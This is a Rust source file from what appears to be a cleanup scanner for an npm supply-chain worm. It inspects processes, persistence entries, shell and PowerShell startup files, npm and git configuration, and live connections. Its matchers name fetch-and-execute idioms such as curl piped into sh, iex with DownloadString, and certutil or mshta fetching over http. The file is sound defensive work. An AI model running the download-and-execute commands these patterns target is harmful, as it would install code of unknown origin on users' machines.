//! The checks that describe the machine rather than the disk.
//!
//! Processes, sockets, the crontab, persistence, shell startup files, the npm
//! and git configuration. `--fs-only` skips all of them, because pointing the
//! scanner at a backup drive asks a question about that drive and not about
//! the laptop holding it.
//!
//! Nothing here runs a command. Whatever is not a file under the home
//! directory comes through [`Host`], so every check below can be handed a
//! machine that does not exist and asserted on. That is the whole reason the
//! boundary is there: these checks went untested for a year because their
//! answer depended on what was running, and an untested check is one that
//! stops matching without anyone finding out.
//!
//! Where a check differs from the shell implementation it replaces, the
//! difference is deliberate and a conformance case argues for it.

use crate::checks::Sink;
use crate::host::{system_path, Autostart, Host, Platform, Probe, Process};
use crate::indicators::Indicators;
use crate::verdict::{Finding, Kind, Verdict};
use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

/// How many lines of evidence one finding prints. The shell capped these with
/// `head`; a process table with two hundred matches is not read line by line.
const MAX_IMPLANT_PROCESSES: usize = 10;
const MAX_INTERPRETERS: usize = 20;
const MAX_CONNECTIONS: usize = 40;

const RECENT: Duration = Duration::from_secs(90 * 24 * 60 * 60);

// ---------------------------------------------------------------------------
// Second-stage implant: the process table
// ---------------------------------------------------------------------------

/// What reading the process table for the implant concluded.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProcessCheck {
    NoneRunning,
    Running,
    /// The table could not be read. Reported as a review item by the check;
    /// the caller must not then claim that no implant was found.
    NotRead,
}

/// The implant sets its own process title, so a match here is a finding even
/// with nothing on disk. Part of the "Second-stage implant" section.
pub fn implant_processes(host: &dyn Host, ind: &Indicators, v: &mut Verdict) -> ProcessCheck {
    let processes = match host.processes() {
        Probe::Read(p) => p,
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not read the process table, so a running implant was not looked for: {why}"
            )));
            return ProcessCheck::NotRead;
        }
    };

    let platform = host.platform();
    let truncates = platform == Platform::Linux;
    let running: Vec<&Process> = processes
        .iter()
        .filter(|p| {
            if platform == Platform::Windows {
                ind.is_implant_image(&p.name)
            } else {
                ind.is_implant_process(&p.name, truncates)
            }
        })
        .take(MAX_IMPLANT_PROCESSES)
        .collect();
    if running.is_empty() {
        return ProcessCheck::NoneRunning;
    }

    for p in &running {
        v.detail(format!("{} {}", p.pid, p.name));
    }
    let mut finding = Finding::hit(
        Kind::Process,
        "an implant process is running now. Kill it before anything else:",
    );
    if host.is_live() {
        for p in &running {
            finding = finding.with_remedy(if platform == Platform::Windows {
                format!("Stop-Process -Id {} -Force", p.pid)
            } else {
                format!("kill -9 {}", p.pid)
            });
        }
    } else {
        // A pid from another machine is somebody else's process on this one.
        finding = finding.with_remedy(
            "this state was supplied, not read here. Kill it on the machine it came from.",
        );
    }
    v.push(finding);
    ProcessCheck::Running
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

pub fn persistence(
    host: &dyn Host,
    home: &Path,
    ind: &Indicators,
    v: &mut Verdict,
    sink: &mut Sink,
) {
    let platform = host.platform();
    v.section(match platform {
        Platform::Linux => "Persistence: systemd units, autostart, cron",
        Platform::MacOs => "Persistence: LaunchAgents, LaunchDaemons, cron",
        Platform::Windows => "Persistence: Run keys, Startup folder, scheduled tasks",
    });

    let root = match host.system_root() {
        Probe::Read(root) => Some(root),
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "system directories could not be read, so system-wide persistence was not checked: {why}"
            )));
            None
        }
    };
    let system = |absolute: &str| root.as_deref().map(|r| system_path(r, absolute));

    match platform {
        Platform::Linux => {
            systemd_units(&home.join(".config/systemd/user"), true, ind, v, sink);
            for dir in ["/etc/systemd/system", "/usr/lib/systemd/system"] {
                if let Some(dir) = system(dir) {
                    systemd_units(&dir, false, ind, v, sink);
                }
            }
            autostart(home, ind, v, sink);
            crontab(host, ind, v);
            for dir in ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly"] {
                if let Some(dir) = system(dir) {
                    system_cron(&dir, ind, v, sink);
                }
            }
        }
        Platform::MacOs => {
            launch_items(&home.join("Library/LaunchAgents"), ind, v, sink);
            for dir in ["/Library/LaunchAgents", "/Library/LaunchDaemons"] {
                if let Some(dir) = system(dir) {
                    launch_items(&dir, ind, v, sink);
                }
            }
            crontab(host, ind, v);
        }
        Platform::Windows => {
            run_keys(host, ind, v);
            startup_folder(
                &home
                    .join("AppData")
                    .join("Roaming")
                    .join("Microsoft")
                    .join("Windows")
                    .join("Start Menu")
                    .join("Programs")
                    .join("Startup"),
                ind,
                v,
                sink,
            );
            if let Some(dir) = system("ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp") {
                startup_folder(&dir, ind, v, sink);
            }
            scheduled_tasks(host, ind, v);
        }
    }
}

// --- Windows -----------------------------------------------------------------

/// A value inside single quotes in PowerShell, where the only character that
/// needs care is the quote itself. The name of a registry value or a task is
/// chosen by whoever planted it.
fn ps_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "''"))
}

/// `(curl|wget|powershell|node|mshta|certutil).*(http|-enc|iex)`, without
/// regard to case: a fetch or an interpreter, then something that makes it
/// one worth reading.
fn windows_fetches_or_interprets(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    let Some(end) = earliest_end(
        &lower,
        &["curl", "wget", "powershell", "node", "mshta", "certutil"],
    ) else {
        return false;
    };
    let rest = lower.get(end..).unwrap_or_default();
    ["http", "-enc", "iex"].iter().any(|t| rest.contains(t))
}

/// What a confirmed entry runs, as evidence under the finding. A value can
/// carry a token in an address, so it goes through the same redaction as
/// everything else that is printed.
fn evidence(v: &mut Verdict, command: &str) {
    if !command.is_empty() {
        v.detail(redact_userinfo(command));
    }
}

fn run_keys(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
    let entries = match host.run_keys() {
        Probe::Read(entries) => entries,
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not read the registry Run keys, so they were not checked: {why}"
            )));
            return;
        }
    };
    let mut flagged = 0usize;
    for entry in &entries {
        let what = format!("{}\\{}", entry.place, entry.name);
        let remove = format!(
            "remove it: Remove-ItemProperty -Path {} -Name {}",
            ps_quote(&entry.place),
            ps_quote(&entry.name)
        );
        if ind.has_strong(&entry.command) {
            flagged += 1;
            evidence(v, &entry.command);
            v.push(
                Finding::hit(
                    Kind::Autostart,
                    format!("run key entry contains an indicator: {what}"),
                )
                .with_remedy(remove),
            );
        } else if ind.names_implant(&entry.command) || ind.is_implant_image(&entry.name) {
            flagged += 1;
            evidence(v, &entry.command);
            v.push(
                Finding::hit(Kind::Autostart, format!("implant run key entry: {what}"))
                    .with_remedy(remove),
            );
        } else if windows_fetches_or_interprets(&entry.command) {
            flagged += 1;
            evidence(v, &entry.command);
            v.push(Finding::review(format!(
                "run key entry runs a network or interpreter command: {what}"
            )));
        }
    }
    if flagged == 0 {
        v.push(Finding::ok(format!(
            "{} Run key {}, none containing an indicator",
            entries.len(),
            if entries.len() == 1 {
                "entry"
            } else {
                "entries"
            }
        )));
    }
    for entry in &entries {
        v.note(format!("{}\\{}", entry.place, entry.name));
    }
}

fn startup_folder(dir: &Path, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
    // desktop.ini is Windows' own, in every Startup folder, and starts nothing.
    let Some(items) = listing(dir, v, |n| !n.eq_ignore_ascii_case("desktop.ini")) else {
        return;
    };
    let items: Vec<PathBuf> = items.into_iter().filter(|p| p.is_file()).collect();
    if items.is_empty() {
        v.push(Finding::ok(format!("nothing in {}", dir.display())));
    }
    for item in &items {
        let Some(text) = read_entry(item, v) else {
            continue;
        };
        if ind.has_strong(&text) {
            let quarantined = sink.take(item, "startup-item");
            v.push(
                Finding::hit(
                    Kind::LoginItem,
                    format!("startup item contains an indicator: {}", item.display()),
                )
                .at(item)
                .with_remedy(quarantined),
            );
        } else {
            v.push(Finding::review(format!(
                "startup item present, verify by hand: {}",
                item.display()
            )));
        }
    }
}

fn scheduled_tasks(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
    let tasks = match host.scheduled_tasks() {
        Probe::Read(tasks) => tasks,
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not list the scheduled tasks, so they were not checked: {why}"
            )));
            return;
        }
    };
    let mut flagged = 0usize;
    let mut own = 0usize;
    for task in &tasks {
        let what = format!("{}{}", task.place, task.name);
        let remove = format!(
            "remove it: Unregister-ScheduledTask -TaskName {} -TaskPath {} -Confirm:$false",
            ps_quote(&task.name),
            ps_quote(&task.place)
        );
        // The implant's own task is looked for everywhere, by name. Hiding
        // under \Microsoft\ would otherwise be all it had to do.
        if ind.is_implant_image(&task.name) || ind.names_implant(&task.command) {
            flagged += 1;
            evidence(v, &task.command);
            v.push(
                Finding::hit(
                    Kind::Autostart,
                    format!("implant scheduled task registered: {what}"),
                )
                .with_remedy(remove),
            );
        } else if ind.has_strong(&task.command) {
            flagged += 1;
            evidence(v, &task.command);
            v.push(
                Finding::hit(
                    Kind::Autostart,
                    format!("scheduled task contains an indicator: {what}"),
                )
                .with_remedy(remove),
            );
        } else if is_windows_own_task(task) {
            own += 1;
        } else if windows_fetches_or_interprets(&task.command) {
            flagged += 1;
            evidence(v, &task.command);
            v.push(Finding::review(format!(
                "scheduled task runs a network or interpreter command: {what}"
            )));
        }
    }
    // Always said, so that a list that came back empty is visible as one.
    let read = format!(
        "{} scheduled tasks read, {} outside Windows' own",
        tasks.len(),
        tasks.len() - own
    );
    v.push(if flagged == 0 {
        Finding::ok(format!("{read}, none containing an indicator"))
    } else {
        Finding::info(read)
    });
}

/// Windows ships hundreds of tasks under `\Microsoft\`, many of which run
/// PowerShell. They are checked for indicators and for the implant, and are
/// not listed for review: nobody reads four hundred lines.
fn is_windows_own_task(task: &Autostart) -> bool {
    task.place.to_ascii_lowercase().starts_with("\\microsoft\\")
}

/// The PowerShell profiles of the account: what a new PowerShell window runs
/// before the prompt appears.
fn powershell_profiles(home: &Path, ind: &Indicators, v: &mut Verdict) {
    v.section("PowerShell profiles");
    let mut seen = 0usize;
    for folder in ["PowerShell", "WindowsPowerShell"] {
        for name in ["Microsoft.PowerShell_profile.ps1", "profile.ps1"] {
            let file = home.join("Documents").join(folder).join(name);
            if !file.is_file() {
                continue;
            }
            seen += 1;
            let Some(text) = read_entry(&file, v) else {
                continue;
            };
            if ind.has_strong(&text) {
                v.push(
                    Finding::hit(
                        Kind::StartupFile,
                        format!(
                            "PowerShell profile contains an indicator: {}",
                            file.display()
                        ),
                    )
                    .at(&file)
                    .with_remedy(
                        "edit it by hand and remove the line. Profiles are never quarantined.",
                    ),
                );
            } else if text.lines().any(downloads_and_executes) {
                v.push(
                    Finding::hit(
                        Kind::StartupFile,
                        format!(
                            "PowerShell profile downloads and executes code: {}",
                            file.display()
                        ),
                    )
                    .at(&file)
                    .with_remedy("edit it by hand and remove the line."),
                );
            } else {
                v.push(Finding::ok(format!("clean: {}", file.display())));
            }
        }
    }
    if seen == 0 {
        v.push(Finding::ok("no PowerShell profile in the home directory"));
    }
}

/// `(iex|Invoke-Expression).*(http|DownloadString)`, on a line that is not a
/// comment, without regard to case.
fn downloads_and_executes(line: &str) -> bool {
    if line.trim_start().starts_with('#') {
        return false;
    }
    let lower = line.to_ascii_lowercase();
    let Some(end) = earliest_end(&lower, &["iex", "invoke-expression"]) else {
        return false;
    };
    let rest = lower.get(end..).unwrap_or_default();
    rest.contains("http") || rest.contains("downloadstring")
}

/// Direct children of `dir` whose name passes `keep`, sorted. `None` when the
/// directory is not there, which is ordinary. A directory that is there and
/// cannot be listed is reported: it was not checked.
fn listing(dir: &Path, v: &mut Verdict, keep: impl Fn(&str) -> bool) -> Option<Vec<PathBuf>> {
    if !dir.is_dir() {
        return None;
    }
    let entries = match fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(e) => {
            v.push(Finding::review(format!(
                "could not read, so it was not checked: {} ({e})",
                dir.display()
            )));
            return None;
        }
    };
    let mut found: Vec<PathBuf> = entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.file_name().and_then(|n| n.to_str()).is_some_and(&keep))
        .collect();
    found.sort();
    Some(found)
}

/// Read a persistence file. `None` for a dangling symlink, which is not an
/// entry at all. Anything else that cannot be read is reported.
fn read_entry(path: &Path, v: &mut Verdict) -> Option<String> {
    match fs::read(path) {
        Ok(bytes) => Some(String::from_utf8_lossy(&bytes).into_owned()),
        Err(e) if e.kind() == io::ErrorKind::NotFound => None,
        Err(e) => {
            v.push(Finding::review(format!(
                "could not read, so it was not checked: {} ({e})",
                path.display()
            )));
            None
        }
    }
}

fn changed_recently(path: &Path) -> bool {
    // The entry itself, not what a symlink points at: a link planted last
    // week to a binary from last year is last week's persistence.
    let Ok(modified) = fs::symlink_metadata(path).and_then(|m| m.modified()) else {
        return false;
    };
    SystemTime::now()
        .duration_since(modified)
        .map_or(true, |age| age <= RECENT)
}

fn recent_inventory(v: &mut Verdict, dir: &Path, items: &[PathBuf], what: &str, hits: usize) {
    let recent: Vec<&PathBuf> = items.iter().filter(|p| changed_recently(p)).collect();
    // The shell printed "none containing an indicator" even under a hit.
    let none = if hits == 0 {
        ", none containing an indicator"
    } else {
        ""
    };
    v.push(Finding::info(format!(
        "{} {what} in {} changed in the last 90 days{none}. Listed in the report.",
        recent.len(),
        dir.display()
    )));
    for path in recent {
        v.note(path.display().to_string());
    }
}

fn file_name(path: &Path) -> String {
    path.file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default()
}

fn systemd_units(dir: &Path, user_scope: bool, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
    let Some(units) = listing(dir, v, |n| n.ends_with(".service") || n.ends_with(".timer")) else {
        return;
    };
    let mut hits = 0usize;
    for unit in &units {
        let Some(text) = read_entry(unit, v) else {
            continue;
        };
        if ind.has_strong(&text) {
            hits += 1;
            let scope = if user_scope {
                "systemctl --user"
            } else {
                "sudo systemctl"
            };
            let quarantined = sink.take(unit, "systemd-unit");
            v.push(
                Finding::hit(
                    Kind::LoginItem,
                    format!("systemd unit contains an indicator: {}", unit.display()),
                )
                .at(unit)
                .with_remedy(format!(
                    "after quarantine, disable it: {scope} disable --now {}",
                    sh_quote(&file_name(unit))
                ))
                .with_remedy(quarantined),
            );
        } else if text.lines().any(unit_line_fetches_or_interprets) {
            v.push(Finding::review(format!(
                "systemd unit runs a network or interpreter command: {}",
                unit.display()
            )));
        }
    }
    recent_inventory(v, dir, &units, "units", hits);
}

fn autostart(home: &Path, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
    let dir = home.join(".config/autostart");
    if !dir.is_dir() {
        v.push(Finding::ok("no ~/.config/autostart"));
        return;
    }
    let Some(entries) = listing(&dir, v, |n| n.ends_with(".desktop")) else {
        return;
    };
    if entries.is_empty() {
        v.push(Finding::ok("~/.config/autostart holds no entries"));
    }
    for entry in &entries {
        let Some(text) = read_entry(entry, v) else {
            continue;
        };
        if ind.has_strong(&text) {
            let quarantined = sink.take(entry, "autostart-entry");
            v.push(
                Finding::hit(
                    Kind::LoginItem,
                    format!("autostart entry contains an indicator: {}", entry.display()),
                )
                .at(entry)
                .with_remedy(quarantined),
            );
        } else {
            v.push(Finding::review(format!(
                "autostart entry present, verify by hand: {}",
                entry.display()
            )));
        }
    }
}

fn system_cron(dir: &Path, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
    let Some(entries) = listing(dir, v, |_| true) else {
        return;
    };
    for entry in entries
        .iter()
        .filter(|p| fs::symlink_metadata(p).is_ok_and(|m| m.is_file()))
    {
        let Some(text) = read_entry(entry, v) else {
            continue;
        };
        if ind.has_strong(&text) {
            let quarantined = sink.take(entry, "system-cron");
            v.push(
                Finding::hit(
                    Kind::LoginItem,
                    format!(
                        "system cron entry contains an indicator: {}",
                        entry.display()
                    ),
                )
                .at(entry)
                .with_remedy(quarantined),
            );
        }
    }
}

fn launch_items(dir: &Path, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
    let Some(items) = listing(dir, v, |n| n.ends_with(".plist")) else {
        return;
    };
    let mut hits = 0usize;
    for item in &items {
        let Some(text) = read_entry(item, v) else {
            continue;
        };
        if ind.has_strong(&text) {
            hits += 1;
            let quarantined = sink.take(item, "launch-item");
            v.push(
                Finding::hit(
                    Kind::LoginItem,
                    format!("launch item contains an indicator: {}", item.display()),
                )
                .at(item)
                .with_remedy(format!(
                    "after quarantine, unload it: launchctl unload {}",
                    sh_quote(&item.display().to_string())
                ))
                .with_remedy(quarantined),
            );
        } else if text.lines().any(|l| fetches_or_interprets(l, LAUNCH_TOOLS)) {
            v.push(Finding::review(format!(
                "launch item runs a network or interpreter command: {}",
                item.display()
            )));
        }
    }
    recent_inventory(v, dir, &items, "launch items", hits);
    v.push(Finding::info(
        "Recent changes only. Persistence installed more than 90 days ago is not listed; its contents are still checked against the indicators.",
    ));
}

fn crontab(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
    match host.crontab() {
        Probe::Read(text) if text.trim().is_empty() => {
            v.push(Finding::ok("user crontab is empty"));
        }
        Probe::Read(text) => {
            // The shell left every non-empty crontab at review, including one
            // naming the campaign's own controller. A unit file or a cron.d
            // entry with the same content was already a hit.
            if ind.has_strong(&text) || ind.infrastructure_in(&text).is_some() {
                v.push(
                    Finding::hit(Kind::Crontab, "user crontab contains an indicator:").with_remedy(
                        "remove the line with: crontab -e. A crontab is never quarantined.",
                    ),
                );
            } else {
                v.push(Finding::review(
                    "user crontab is not empty, review every line:",
                ));
            }
            for line in text.lines().filter(|l| !l.trim().is_empty()) {
                v.detail(line);
            }
        }
        // No crontab command means no user crontab to run. Said out loud,
        // because it is a different statement from "it was empty".
        Probe::NoTool(_) => v.push(Finding::ok(
            "no crontab command on this machine, so there is no user crontab",
        )),
        Probe::Failed(why) => v.push(Finding::review(format!(
            "could not read the user crontab, so it was not checked: {why}"
        ))),
    }
}

// ---------------------------------------------------------------------------
// Shell startup files
// ---------------------------------------------------------------------------

pub fn shell_startup(home: &Path, platform: Platform, ind: &Indicators, v: &mut Verdict) {
    if platform == Platform::Windows {
        powershell_profiles(home, ind, v);
        return;
    }
    v.section("Shell startup files");
    let names: &[&str] = match platform {
        Platform::Linux => &[
            ".bashrc",
            ".bash_profile",
            ".profile",
            ".zshrc",
            ".zprofile",
            ".zshenv",
        ],
        Platform::MacOs => &[
            ".zshrc",
            ".zprofile",
            ".zshenv",
            ".bashrc",
            ".bash_profile",
            ".profile",
        ],
        // Handled above: Windows has profiles, not dot files.
        Platform::Windows => &[],
    };

    let mut seen = 0usize;
    for name in names {
        let file = home.join(name);
        if !file.is_file() {
            continue;
        }
        seen += 1;
        let text = match fs::read(&file) {
            Ok(bytes) => String::from_utf8_lossy(&bytes).into_owned(),
            Err(e) => {
                v.push(Finding::review(format!(
                    "could not read, so it was not checked: {} ({e})",
                    file.display()
                )));
                continue;
            }
        };
        if ind.has_strong(&text) {
            v.push(
                Finding::hit(
                    Kind::StartupFile,
                    format!(
                        "shell startup file contains an indicator: {}",
                        file.display()
                    ),
                )
                .at(&file)
                .with_remedy(
                    "edit it by hand and remove the line. This file is never quarantined.",
                ),
            );
        } else if text.lines().any(pipes_a_download_into_an_interpreter) {
            v.push(
                Finding::hit(
                    Kind::StartupFile,
                    format!(
                        "shell startup file pipes a download into an interpreter: {}",
                        file.display()
                    ),
                )
                .at(&file)
                .with_remedy("edit it by hand and remove the line."),
            );
        } else if text.lines().any(|l| l.len() > 2000) {
            v.push(Finding::review(format!(
                "shell startup file has a very long line: {}",
                file.display()
            )));
        } else {
            v.push(Finding::ok(format!("clean: {}", file.display())));
        }
    }
    if seen == 0 {
        // The shell printed nothing here, and a section that prints nothing
        // reads the same as one that never ran.
        v.push(Finding::ok("no shell startup files in the home directory"));
    }
}

// ---------------------------------------------------------------------------
// Git: the global configuration
// ---------------------------------------------------------------------------

/// The first lines of the "Git configuration and hooks" section.
pub fn git_global_config(host: &dyn Host, v: &mut Verdict) {
    let config = match host.git_global_config() {
        Probe::Read(lines) => lines,
        Probe::NoTool(_) => {
            v.push(Finding::ok(
                "git is not installed, so there is no global core.hooksPath",
            ));
            return;
        }
        Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not read the global git configuration, so core.hooksPath was not checked: {why}"
            )));
            return;
        }
    };

    // git lowercases the section and the variable name when it lists them.
    let entries: Vec<(String, &str)> = config
        .iter()
        .filter_map(|line| line.split_once('='))
        .map(|(key, value)| (key.to_ascii_lowercase(), value))
        .collect();

    match entries
        .iter()
        .find(|(key, value)| key == "core.hookspath" && !value.is_empty())
    {
        Some((_, path)) => v.push(Finding::review(format!(
            "global core.hooksPath is set to: {path}"
        ))),
        None => v.push(Finding::ok("no global core.hooksPath")),
    }

    // Inventory: the settings that redirect where git fetches from or hands
    // credentials to. The key decides, never the whole line.
    for (key, value) in &entries {
        let redirects = (key.starts_with("url.") && key.ends_with("insteadof"))
            || (key.starts_with("http.") && key.ends_with("proxy"))
            || (key.starts_with("credential") && key.ends_with(".helper"));
        if redirects {
            v.detail(format!("{key}={}", redact_userinfo(value)));
        }
    }
}

// ---------------------------------------------------------------------------
// npm
// ---------------------------------------------------------------------------

pub fn npm_config(home: &Path, ind: &Indicators, v: &mut Verdict) {
    v.section("npm configuration");
    let npmrc = home.join(".npmrc");
    let text = match fs::read(&npmrc) {
        Ok(bytes) => String::from_utf8_lossy(&bytes).into_owned(),
        Err(e) if e.kind() == io::ErrorKind::NotFound => {
            v.push(Finding::ok("no ~/.npmrc"));
            ignore_scripts_advice(None, v);
            return;
        }
        Err(e) => {
            v.push(Finding::review(format!(
                "could not read ~/.npmrc, so it was not checked: {e}"
            )));
            return;
        }
    };

    v.push(Finding::info("~/.npmrc, tokens redacted:"));
    for line in text.lines() {
        v.detail(redact_npmrc_line(line));
    }
    if text.contains("_authToken") {
        v.push(Finding::info(
            "an npm auth token is stored on disk. Rotate it regardless of this scan.",
        ));
    }

    let registries: Vec<&str> = text
        .lines()
        .filter_map(|l| l.split_once('='))
        .filter(|(key, _)| key.trim() == "registry")
        .map(|(_, value)| value.trim())
        .collect();
    if !registries.is_empty() && !registries.iter().any(|r| r.contains("registry.npmjs.org")) {
        for registry in &registries {
            // The shell called any non-default registry a confirmed hit, which
            // reports every company with a private registry as compromised.
            // It is confirmed only when it is the campaign's own host.
            if ind.has_strong(registry) || ind.infrastructure_in(registry).is_some() {
                v.push(
                    Finding::hit(
                        Kind::Registry,
                        format!(
                            "the npm registry is set to known campaign infrastructure: {}",
                            redact_userinfo(registry)
                        ),
                    )
                    .at(&npmrc),
                );
            } else {
                v.push(Finding::review(format!(
                    "a non-default npm registry is configured, confirm it is yours: {}",
                    redact_userinfo(registry)
                )));
            }
        }
    }
    ignore_scripts_advice(Some(&text), v);
}

/// Hardening advice, never a finding. Read from `~/.npmrc` rather than by
/// running `npm config get`: this tool is the cleanup for an npm supply-chain
/// worm, and executing npm on a machine suspected of it to ask a question a
/// file answers is not a trade worth making.
fn ignore_scripts_advice(npmrc: Option<&str>, v: &mut Verdict) {
    let on = npmrc.is_some_and(|text| {
        text.lines()
            .filter_map(|l| l.split_once('='))
            .any(|(key, value)| key.trim() == "ignore-scripts" && value.trim() == "true")
    });
    if on {
        v.push(Finding::ok("npm ignore-scripts is on"));
    } else {
        v.push(Finding::info(
            "npm ignore-scripts is not set in ~/.npmrc. Hardening, not a finding: npm config set ignore-scripts true",
        ));
    }
}

// ---------------------------------------------------------------------------
// Resident interpreters
// ---------------------------------------------------------------------------

pub fn interpreters(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
    v.section("Resident interpreters running inline code");
    let processes = match host.processes() {
        Probe::Read(p) => p,
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not read the process table, so resident interpreters were not checked: {why}"
            )));
            return;
        }
    };

    let inline: Vec<&Process> = processes
        .iter()
        .filter(|p| runs_inline_code(&p.command))
        .take(MAX_INTERPRETERS)
        .collect();
    if inline.is_empty() {
        v.push(Finding::ok("no interpreter running inline code right now"));
        return;
    }

    for p in &inline {
        v.detail(format!("{} {}", p.pid, p.command));
    }
    let implant = inline.iter().any(|p| {
        ind.implant_names
            .iter()
            .any(|name| p.command.contains(name.as_str()))
    });
    if implant {
        v.push(Finding::hit(
            Kind::Process,
            "an interpreter is running implant code right now",
        ));
    } else {
        v.push(Finding::review(
            "an interpreter is running code passed on the command line. Read each one.",
        ));
        v.push(Finding::info(
            "editors and coding agents do this legitimately. Full command lines are in the report.",
        ));
    }
}

// ---------------------------------------------------------------------------
// Live connections
// ---------------------------------------------------------------------------

pub fn connections(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
    v.section("Live connections from node and Electron processes");
    let platform = host.platform();
    let all = match host.connections() {
        Probe::Read(lines) => lines,
        Probe::NoTool(why) => {
            v.push(Finding::review(format!("{why}, skipped")));
            return;
        }
        Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "could not list connections, so they were not checked: {why}"
            )));
            return;
        }
    };

    // Every connection, not only the editors'. The second stage is a native
    // binary under its own name, and the shell's filter for node and Electron
    // looked straight past it.
    let to_campaign: Vec<&String> = all
        .iter()
        .filter(|line| ind.infrastructure_in(line).is_some())
        .take(MAX_CONNECTIONS)
        .collect();
    if !to_campaign.is_empty() {
        for line in &to_campaign {
            v.detail(line.as_str());
        }
        v.push(Finding::hit(
            Kind::Connection,
            "live connection to known campaign infrastructure",
        ));
        return;
    }

    let editors: Vec<&String> = all
        .iter()
        .filter(|line| from_node_or_editor(line, platform))
        .take(MAX_CONNECTIONS)
        .collect();
    if editors.is_empty() {
        v.push(Finding::ok(
            "no established node or Electron TCP connections right now",
        ));
        return;
    }
    v.push(Finding::ok(format!(
        "{} established connections from editors and node, none to known campaign infrastructure",
        editors.len()
    )));
    v.push(Finding::info("the connection list is in the report file"));
    for line in editors {
        v.note(line.as_str());
    }
}

fn from_node_or_editor(line: &str, platform: Platform) -> bool {
    let names: &[&str] = match platform {
        Platform::Linux | Platform::Windows => &["node", "code", "cursor", "electron"],
        Platform::MacOs => &["node", "code helper", "cursor", "electron"],
    };
    let line = line.to_ascii_lowercase();
    names.iter().any(|n| line.contains(n))
}

// ---------------------------------------------------------------------------
// Text matching. Written out because the crate has no dependencies, and kept
// small so each is tested against the cases it exists for.
// ---------------------------------------------------------------------------

/// Where the earliest match of any needle ends.
fn earliest_end(line: &str, needles: &[&str]) -> Option<usize> {
    needles
        .iter()
        .filter_map(|n| line.find(n).map(|at| at + n.len()))
        .min()
}

const UNIT_TOOLS: &[&str] = &["curl", "wget", "node", "base64", "python"];
const LAUNCH_TOOLS: &[&str] = &["curl", "wget", "node", "osascript", "base64", "python"];

/// `(tool).*(http|-e |eval)`: a fetch or an interpreter, then something that
/// makes it one worth reading.
fn fetches_or_interprets(line: &str, tools: &[&str]) -> bool {
    let Some(end) = earliest_end(line, tools) else {
        return false;
    };
    let rest = line.get(end..).unwrap_or_default();
    ["http", "-e ", "eval"].iter().any(|t| rest.contains(t))
}

fn unit_line_fetches_or_interprets(line: &str) -> bool {
    (line.starts_with("ExecStart=") || line.starts_with("ExecStartPre="))
        && fetches_or_interprets(line, UNIT_TOOLS)
}

/// `curl ... | sh`, on a line that is not a comment.
///
/// Two narrowings against the shell's pattern, each of which reported a clean
/// machine as compromised. A commented-out line runs nothing. And the pattern
/// ended at `sh` without asking what followed, so `curl ... | shasum`, which
/// is how a careful person verifies a download, matched as piping into `sh`.
fn pipes_a_download_into_an_interpreter(line: &str) -> bool {
    if line.trim_start().starts_with('#') {
        return false;
    }
    let Some(end) = earliest_end(line, &["curl", "wget"]) else {
        return false;
    };
    let rest = line.get(end..).unwrap_or_default();
    rest.match_indices('|').any(|(at, _)| {
        let after = rest
            .get(at + 1..)
            .unwrap_or_default()
            .trim_start_matches(|c: char| c.is_ascii_whitespace());
        ["bash", "sh", "node"].iter().any(|interpreter| {
            after.strip_prefix(interpreter).is_some_and(|tail| {
                !tail
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
            })
        })
    })
}

/// `(node|python[0-9.]*)[[:space:]]+-(e|c)[[:space:]]`
fn runs_inline_code(command: &str) -> bool {
    ["node", "python"].iter().any(|interpreter| {
        command.match_indices(interpreter).any(|(at, found)| {
            let mut rest = command.get(at + found.len()..).unwrap_or_default();
            if *interpreter == "python" {
                let versioned = rest.trim_start_matches(|c: char| c.is_ascii_digit() || c == '.');
                // python3.12.exe: the last dot belongs to the extension.
                let ate_a_dot = rest.len() > versioned.len()
                    && rest
                        .get(..rest.len() - versioned.len())
                        .is_some_and(|eaten| eaten.ends_with('.'));
                rest = match versioned.get(..3) {
                    Some(ext) if ate_a_dot && ext.eq_ignore_ascii_case("exe") => {
                        versioned.get(3..).unwrap_or_default()
                    }
                    _ => versioned,
                };
            }
            // Windows: node.exe, and a quoted path ends with a quote.
            for suffix in [".exe", ".EXE", "\""] {
                rest = rest.strip_prefix(suffix).unwrap_or(rest);
            }
            let flag = rest.trim_start_matches(|c: char| c.is_ascii_whitespace());
            if flag.len() == rest.len() {
                return false;
            }
            let mut chars = flag.chars();
            chars.next() == Some('-')
                && matches!(chars.next(), Some('e' | 'c'))
                && chars.next().is_some_and(|c| c.is_ascii_whitespace())
        })
    })
}

/// Quote a value for a command the operator is going to paste.
///
/// The name of a planted file is chosen by whoever planted it. Wrapped in
/// plain single quotes, a name containing one closes the quote and the rest
/// runs as a command, in the terminal of the person cleaning up.
pub(crate) fn sh_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// `https://user:secret@host/` becomes `https://<REDACTED>@host/`.
fn redact_userinfo(value: &str) -> String {
